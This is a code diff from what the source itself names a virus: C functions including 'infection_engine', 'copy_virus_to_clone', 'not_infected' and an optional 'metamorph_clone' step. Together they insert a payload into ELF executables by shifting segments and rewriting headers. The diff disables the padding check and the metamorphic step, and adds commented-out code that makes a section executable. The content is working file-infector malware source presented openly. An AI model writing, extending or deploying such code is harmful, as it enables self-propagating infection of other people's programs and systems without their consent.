@@ -10,22 +10,29 @@ static bool	adjust_sizes(struct entry *clone_entry,
 	clone_entry->safe_phdr->p_filesz += shift_amount;
 	clone_entry->safe_phdr->p_memsz += shift_amount;
 
+	// if (clone_entry->safe_shdr->sh_type == SHT_NOBITS)
+	// {
+	// 	clone_entry->safe_shdr->sh_type = SHT_PROGBITS;
+	// 	clone_entry->safe_phdr->p_flags |= PF_X;
+		// clone_entry->safe_phdr->p_filesz += clone_entry->safe_shdr->sh_size;
+		// clone_entry->safe_phdr->p_memsz  += clone_entry->safe_shdr->sh_size;
+	// }
 	return true;
 }
 
 static bool	define_shift_amount(const struct entry *file_entry,
 			size_t *shift_amount, size_t full_virus_size)
 {
-	const size_t	p_filesz        = file_entry->safe_phdr->p_filesz;
-	const size_t	p_offset        = file_entry->safe_phdr->p_offset;
-	const size_t	segment_end     = p_offset + p_filesz;
-	const size_t	segment_padding = segment_end - file_entry->payload_offset;
-
-	if (full_virus_size < segment_padding)
-	{
-		*shift_amount = 0;
-		return true;
-	}
+	// const size_t	p_filesz        = file_entry->safe_phdr->p_filesz;
+	// const size_t	p_offset        = file_entry->safe_phdr->p_offset;
+	// const size_t	segment_end     = p_offset + p_filesz;
+	// const size_t	segment_padding = segment_end - file_entry->payload_offset;
+	//
+	// if (full_virus_size < segment_padding)
+	// {
+	// 	*shift_amount = 0;
+	// 	return true;
+	// }
 
 	const size_t	p_memsz = file_entry->safe_phdr->p_memsz;
 	const size_t	p_align = file_entry->safe_phdr->p_align;
@@ -53,9 +60,9 @@ bool		infection_engine(struct virus_header *vhdr,
 
 	if (!find_entry(&file_entry, file_ref, *full_virus_size)
 	|| !not_infected(&file_entry, file_ref)
-	|| !copy_virus_to_clone(clone_ref, &file_entry, vhdr)
+	|| !copy_virus_to_clone(clone_ref, *loader_offset, vhdr)
 	|| !generate_seed(seed, file_ref)
-	|| !metamorph_clone(clone_ref, *loader_offset, full_virus_size, vhdr)
+	// || !metamorph_clone(clone_ref, *loader_offset, full_virus_size, vhdr)
 	|| !define_shift_amount(&file_entry, shift_amount, *full_virus_size)
 	|| !copy_client_to_clone(clone_ref, file_ref, *loader_offset, *shift_amount)
 	|| !adjust_references(clone_ref, *shift_amount, *loader_offset)
